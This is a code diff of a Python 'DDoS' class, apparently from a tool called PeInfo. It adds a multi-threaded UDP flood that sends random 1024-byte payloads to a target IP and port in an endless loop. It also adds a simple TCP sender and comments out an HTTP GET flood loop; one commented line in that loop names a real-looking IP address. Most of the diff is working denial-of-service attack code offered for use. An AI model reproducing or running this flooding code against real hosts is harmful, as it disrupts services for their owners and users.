@@ -43,7 +43,7 @@ class DDoS:
                self.target = sys.argv[-1]
                print("PeInfo attacking DDoS with UDP method with target", self.target, "with thread", thread, "and port", port, f"for {second}s")
                if self.ping_host(self.target):
-                  self.start_udp_flood(port=int(port), threads_count=int(thread))
+                  self.udp_ddos_attack(target_ip=self.target, target_port=int(port), num_threads=int(thread))
                   # self.countdown_timer(seconds=int(second), port=int(port), thread=thread)
                break
             else:
@@ -64,7 +64,8 @@ class DDoS:
                self.target = sys.argv[-1]
                print(Fore.RED, "PeInfo attacking DDoS with TCP method with target", self.target, "with thread", thread, "and port", port)
                if self.ping_host(self.target):
-                  self.start_tcp_flood(threads_count=int(thread))
+                  self.tcp_ddos_attack(target_ip=self.target, target_port=int(port))
+                  # self.start_tcp_flood(threads_count=int(thread))
                   # self.countdown_timer(seconds=int(second), port=port, thread=thread)
                break
             else:
@@ -76,43 +77,82 @@ class DDoS:
          else:
             Help.exampleUsage()
             break
-          
-    def udp_method(self, port):
-      i = 0
-      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      payload = random._urandom(1024)
+
+    def tcp_ddos_attack(self, target_ip, target_port):
+      # create a socket object
+      client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+      server_ip = "127.0.0.1"  # replace with the server's IP address
+      server_port = 8000  # replace with the server's port number
+      # establish connection with server
+      client.connect((target_ip, target_port))
+
       while True:
+         # input message and send it to the server
+         msg = "Hello World Umsida"
+         client.send(msg.encode("utf-8")[:1024])
+
+         # receive message from the server
+         response = client.recv(1024)
+         response = response.decode("utf-8")
+
+         # if server sent us "closed" in the payload, we break out of the loop and close our socket
+         if response.lower() == "closed":
+               break
+
+         print(f"Received: {response}")
+
+      # close client socket (connection to the server)
+      client.close()
+      print("Connection to server closed")
+          
+
+    def udp_ddos_attack(self, target_ip, target_port, num_threads):
+      """
+      Simulates a UDP-based DDoS attack on a given IP and port.
+      
+      Parameters:
+      target_ip (str): Target IP address.
+      target_port (int): Target port number.
+      num_threads (int): Number of threads to simulate the attack.
+      """
+      def attack():
          try:
-            sock.sendto(payload, (self.target, port))
-            print(f"{i}. Packet sent to {self.target}: {port}")
-         except Exception as e:
-            print(f"Error: {e}")
-         i += 1
+            # Create a UDP socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            # Generate a random payload
+            payload = random._urandom(1024)  # 1024-byte payload
+            while True:
+               # Send the payload repeatedly to the target
+               s.sendto(payload, (target_ip, target_port))
+               print(f"Packet sent to {target_ip}:{target_port}")
+         except OSError as exc:
+            if exc.errno == 55:
+               time.sleep(0.1)
+            else:
+               raise
 
-    def start_udp_flood(self, threads_count, port):
-      threads = []
-      for i in range(threads_count):
-         thread = threading.Thread(target=self.udp_method(port=port))
-         threads.append(thread)
+      # Start threads to simulate concurrent attack
+      for i in range(num_threads):
+         thread = threading.Thread(target=attack)
          thread.start()
-
-      for thread in threads:
-         thread.join()
+         print(f"Thread-{i+1} started.")
 
 
     
-    def tcp_method(self):
-       i = 0
-       headers = {
-          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-       }
-       try:
-          while True:
-            response = requests.get(f"https://{self.target}", headers=headers)
-            i += 1
-            print(f"{i}. Packet sent with status code: {response.status_code}")
-       except Exception as e:
-          print(f"Error: {e}")
+   #  def tcp_method(self):
+   #     i = 0
+   #     headers = {
+   #        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+   #     }
+   #     try:
+   #        while True:
+   #          # response = requests.get("103.139.25.68", headers=headers)
+   #          response = requests.get(f"https://{self.target}", headers=headers)
+   #          i += 1
+   #          print(f"{i}. Packet sent with status code: {response.status_code}")
+   #     except Exception as e:
+   #        print(f"Error: {e}")
 
 
     def start_tcp_flood(self, threads_count):
